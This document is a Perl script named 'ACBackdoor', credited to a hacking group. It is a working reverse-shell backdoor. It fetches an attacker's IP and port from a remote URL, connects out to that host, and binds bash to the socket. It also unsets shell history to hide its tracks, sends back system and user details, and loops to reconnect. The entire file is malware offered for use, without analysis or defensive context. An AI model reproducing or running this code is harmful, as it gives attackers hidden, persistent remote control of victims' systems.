#!/usr/bin/perl

# ACBackdoor v.1
# Code by JosS
# Contact: sys-project[at]hotmail.com
# Spanish Hackers Team | Sys-Project
# http://www.spanish-hackers.com

use IO::Socket;
use LWP::UserAgent;

inicio:;

$system    = '/bin/bash';
if (!$ARGV[0]) { 
   print "Error ...!";
   print "Usage: ACBackdoor.pl [URL]\n\n"; 
   die "Ex: ACBackdoor.pl http://www.spanish-hackers.com/host.txt \n"; 
} 


my $ua       = LWP::UserAgent->new;
my $response = $ua->get("$ARGV[0]");

if ($response->is_success) {
    $doc = $response->content;
}
else {
    die $response->status_line;
}

($ip, $puerto) = $doc =~ m/([\w.]+):(\w+)/simo;

print "ACBackdoor Running ... By JosS - Spanish Hackers Team - \n\n"; 

use Socket; 
use FileHandle; 
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp')) or die print "[-] Unable to Resolve Host\n"; 
connect(SOCKET, sockaddr_in($puerto, inet_aton($ip))) or die print "[-] Unable to Connect Host\n"; 
print "[*] Resolving HostName\n";
print "[*] Connecting To: $ip|$puerto \n"; 
print "[*] Spawning Shell \n";
print "[*] Connected to remote host \n";
SOCKET->autoflush(); 
open(STDIN, ">&SOCKET"); 
open(STDOUT,">&SOCKET"); 
open(STDERR,">&SOCKET"); 
print "ACBackdoor Running ... By JosS - Spanish Hackers Team - \n\n"; 
system("unset HISTFILE; unset SAVEHIST ;echo --==Systeminfo==-- ; uname -a;echo;
echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shell==-- "); 
system($system);

goto inicio;

# spanish-hackers.com
